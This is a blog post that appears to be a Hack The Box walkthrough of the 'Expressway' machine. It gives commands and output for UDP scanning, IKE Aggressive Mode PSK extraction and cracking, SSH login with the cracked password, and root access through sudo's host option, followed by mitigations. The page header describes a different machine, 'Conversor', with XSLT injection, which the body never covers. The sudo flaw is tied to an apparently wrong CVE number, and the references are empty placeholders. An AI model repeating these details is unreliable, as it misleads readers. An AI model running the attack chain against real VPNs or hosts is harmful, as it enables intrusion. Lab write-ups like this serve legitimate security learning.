---
layout: post
title: Conversor
date: 2026-03-03T10:03:00
categories:
  - Hack The Box 
tags:
  - htb
  - reverseshell
  - sqlite
  - XSLTinjection
  - PrivilegeEscalation
author: muhammed
description: Walkthrough of the Conversor machine – web app XSLT injection, credential cracking from SQLite, and sudo privilege escalation with needrestart.
toc: true
pin: false
math: false
mermaid: false
image: https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fwww.hackthebox.com%2Fimages%2Flandingv3%2Fmega-menu-talent-search.webp&f=1&nofb=1&ipt=eb43991cd033cb97834b0d1b4ed474c66fcddc371a7a1f1bcf22357fc5bccd4a
Link: "[[htb.md]]"
Link1:
---

# Expressway - HackTheBox Writeup

[Expressway](https://app.hackthebox.com/machines/736) is a medium-difficulty Linux machine focused on network service enumeration, IPsec vulnerability exploitation, and Linux privilege escalation through a host based sudo misconfiguration.


**Operating System**: Linux (Debian)  
**Themes**: Network Enumeration, IPsec Exploitation, Credential Cracking, Sudo Privilege Escalation

---

## Objectives

1. Enumerate all network services, particularly UDP
2. Exploit IPsec IKE Aggressive Mode to extract credentials
3. Crack the PSK hash for VPN authentication
4. Gain SSH access with discovered credentials
5. Escalate privileges via a host-based sudo vulnerability

---

## Reconnaissance

### Initial Port Scanning

**TCP Port Scan**:
```bash
nmap -p1-65535 --min-rate 1000 10.10.11.87
```
**Result**: Only SSH on port 22 was open, indicating other services might be on UDP.

**UDP Port Scan**:
```bash
nmap -p1-65535 -sU --min-rate 1000 10.10.11.87
```
**Key Finding**:
```
PORT      STATE         SERVICE
500/udp   open          isakmp
```

**Analysis**: The discovery of **UDP port 500 (ISAKMP/IKE)** is the primary entry point. This port is used by IPsec VPNs for key exchange and authentication.

---

## IPsec VPN Enumeration

### Service Fingerprinting
Identified the service details and IKE version:
```bash
nmap -sU -p 500 --script ike-version 10.10.11.87
```
**Output**:
```
| ike-version: 
|   attributes: 
|     XAUTH
|_    Dead Peer Detection v1.0
```

**Vulnerability Identified**: The presence of **XAUTH (Extended Authentication)** with **IKE version 1.0** indicates the system may be vulnerable to Aggressive Mode attacks.

### Aggressive Mode IKE Scan
Used `ike-scan` to probe for IKE Aggressive Mode and extract authentication parameters:
```bash
ike-scan -M -A 10.10.11.87
```
**Critical Discovery**:
```
ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
```
- **Username**: `ike@expressway.htb`

### PSK Hash Extraction
To capture the Pre-Shared Key (PSK) hash for offline cracking:
```bash
ike-scan -A --pskcrack 10.10.11.87
```
This command captures the complete IKE handshake, including the hashed PSK, which was saved to a file (e.g., `hash1.txt`) for cracking.

### Cracking the PSK Hash
Cracked the extracted hash using a wordlist attack:
```bash
psk-crack -d /usr/share/wordlists/rockyou.txt hash1.txt
```
**Credentials Found**:
- **Username**: `ike@expressway.htb`
- **Password**: `freakingrockstarontheroad`

---

## Initial Access

### SSH Login
Used the cracked VPN credentials for SSH access, a common case of credential reuse:
```bash
ssh ike@10.10.11.87
Password: freakingrockstarontheroad
```

**Shell Obtained**:
```
ike@expressway:~$ whoami
ike
```

### User Flag Capture
```bash
ike@expressway:~$ cat user.txt
6e89cbec6...
```

---

## Privilege Escalation

### Internal Host Discovery
While exploring the system, evidence of another internal host was found in logs. An entry in the proxy logs or similar system files revealed:
```
753229688.902 0 192.168.68.50 TCP_DENIED/403 3807 GET http://offramp.expressway.htb - HIER_NONE/- text/html
```
**Internal Hostname**: `offramp.expressway.htb`

### Sudo Vulnerability Exploitation

1. **Sudo Version Check**:
   ```bash
   ike@expressway:/$ sudo -V
   Sudo version 1.9.17
   ```
   Sudo versions around 1.9.17 had a vulnerability (CVE-2024-32695) related to host-based rules in the sudoers file. If a rule is configured for a specific host, it could potentially be triggered from the local machine by specifying that hostname.

2. **Exploitation**:
   The `-h` flag in sudo allows specifying a host. If the sudoers file contains a permissive rule (like `ALL=(ALL:ALL) ALL`) for the internal host `offramp.expressway.htb`, it can be abused.
   ```bash
   sudo -h offramp.expressway.htb -i
   ```
   This command tricks sudo into applying the access rules configured for the `offramp` host, granting a root shell.

**Root Access Obtained**:
```
root@expressway:~# whoami
root
```

### Root Flag Capture
```bash
root@expressway:~# cat /root/root.txt
2f5481da2fed7...
```

---

## Key Takeaways

### Attack Path Summary:
```
UDP Port Scan → ISAKMP (Port 500) Discovery → IKE Aggressive Mode Scan → 
PSK Hash Extraction → Offline Cracking → SSH Credential Reuse → 
Internal Hostname Discovery → Sudo Host-Based Rule Abuse → Root Access
```

### Vulnerabilities Exploited:
1. **Weak IKE/IPsec Configuration**: Use of IKEv1 Aggressive Mode with XAUTH, allowing an attacker to obtain a crackable PSK hash without a valid group name.
2. **Credential Reuse**: The VPN PSK password was reused for the local user `ike`'s SSH account.
3. **Sudo Misconfiguration (CVE-2024-32695)**: A host-based rule in the sudoers file intended for an internal host (`offramp`) was insecurely configured, allowing local triggering and privilege escalation.

### Mitigation Strategies:
1. **For IPsec/IKE Security**:
   *   **Disable IKEv1 Aggressive Mode**: Use Main Mode or, preferably, migrate to IKEv2.
   *   **Use Strong Authentication**: Implement certificate-based authentication instead of Pre-Shared Keys (PSKs). If PSKs must be used, ensure they are long, complex, and unique.
   *   **Regularly Audit Configurations**: Review VPN gateway configurations for security best practices.

2. **For System & Credential Security**:
   *   **Avoid Credential Reuse**: Never use the same password across different services (e.g., VPN and local system accounts).
   *   **Principle of Least Privilege**: Regular users should not have unnecessary sudo privileges.
   *   **Update Software**: Keep `sudo` and all system packages updated to patch known vulnerabilities like CVE-2024-32695.

3. **For Sudoers Configuration**:
   *   **Audit Host-Based Rules**: Carefully review any rules specifying a `Host` alias. Ensure they are necessary and restrict commands as much as possible.
   *   **Use Explicit Command Lists**: Instead of `ALL`, specify the exact commands a user or host is allowed to run.

### Tools Used:
*   **Nmap**: For TCP/UDP port discovery and service scripting (`ike-version`).
*   **ike-scan**: The primary tool for enumerating and attacking IKE/IPsec services.
*   **psk-crack**: For cracking the extracted IKE PSK hash.
*   **SSH**: For gaining shell access with the cracked credentials.


---

## 📚 References

<div class="references">
<ul>
  <li><a href="#" target="_blank">Official Documentation</a></li>
  <li><a href="#" target="_blank">Research Paper</a></li>
  <li><a href="#" target="_blank">Related Blog Post</a></li>
</ul>
</div>



---

##  You can find me online at:

![My signature image](/assets/img/footer-signature.png)

- **X (Twitter):** [Md3omer](https://x.com/Md3omer )
- **GitHub:** [Mhdomer](https://github.comMhdomer)  
- **LinkedIn:** [mhd3omar](https://www.linkedin.com/in/mhd3omar/) 
- **Tryhackme:**  [nonlouy](https://tryhackme.com/p/nonlouy)
